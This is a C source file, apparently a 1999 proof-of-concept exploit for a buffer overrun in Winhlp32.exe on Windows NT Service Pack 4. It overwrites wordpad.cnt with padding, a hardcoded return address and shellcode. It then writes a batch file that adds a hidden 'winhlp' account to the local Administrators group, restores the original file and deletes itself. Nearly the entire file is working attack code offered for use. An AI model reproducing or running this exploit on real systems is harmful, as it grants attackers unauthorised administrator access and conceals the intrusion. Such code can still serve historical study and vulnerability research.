#include <stdio.h>
#include <windows.h>
#include <string.h>

int main(void)
{
 char eip[5]="\xE5\x27\xF3\x77";
 char
ExploitCode[200]="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA\x1A\x38\xF1\x77\x52\x8D\x45\xF4\x50\xFF\x55\xF0\x55\x8B\xEC\x33\xFF\x57\xC6\x45\xFC\x41\xC6\x45\xFD\x44\xC6\x45\xFE\x44\xB8\xE1\xE1\xA0\x77\x50\x8D\x45\xFC\x50\xFF\x55\xF8\x55\x8B\xEC\xBA\xBA\x5B\x9F\x77\x52\x33\xC0\x50\xFF\x55\xFC";

 FILE *fd;
 printf("\n\n*******************************************************\n");
 printf("* WINHLPADD exploits a buffer overrun in Winhlp32.exe *\n");
 printf("*   This version runs on Service Pack 4 machines and  *\n");
 printf("*       assumes a msvcrt.dll version of 4.00.6201     *\n");
 printf("*                                                     *\n");
 printf("* (C) David Litchfield (mnemonix@globalnet.co.uk) '99 *\n");
 printf("*******************************************************\n\n");

 fd = fopen("wordpad.cnt", "r");
 if (fd==NULL)
  {
   printf("\n\nWordpad.cnt not found or insufficient rights to access it.\nRun this from the WINNT\\HELP directory");
   return 0;
  }
 fclose(fd);
 printf("\nMaking a copy of real wordpad.cnt - wordpad.sav\n");
 system("copy wordpad.cnt wordpad.sav");
 printf("\n\nCreating wordpad.cnt with exploit code...");
 fd = fopen("wordpad.cnt", "w+");
 if (fd==NULL)  
  {
   printf("Failed to open wordpad.cnt in write mode. Check you have sufficent rights\n");
   return 0;
  }
 fprintf(fd,"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%s%s\n",eip,ExploitCode);

 fprintf(fd,"2 Opening a document=WRIPAD_OPEN_DOC\n");
 fclose(fd);
 printf("\nCreating batch file add.bat\n\n");
 fd = fopen("add.bat", "w");
 if (fd == NULL)
  {
   printf("Couldn't create batch file. Manually create one instead");
   return 0;
  }
 printf("The batch file will attempt to create a user account called \"winhlp\" and\n");
 printf("with a password of \"winhlp!!\" and add it to the Local Administrators group.\n");
 printf("Once this is done it will reset the files and delete itself.\n");
 fprintf(fd,"net user winhlp winhlp!! /add\n");
 fprintf(fd,"net localgroup administrators winhlp /add\n");
 fprintf(fd,"del wordpad.cnt\ncopy wordpad.sav wordpad.cnt\n");
 fprintf(fd,"del wordpad.sav\n");
 fprintf(fd,"del add.bat\n");
 fclose(fd);  
 printf("\nBatch file created.");
 printf("\n\nCreated. Now open up Wordpad and click on Help\n");

 return 0;
   
 
}

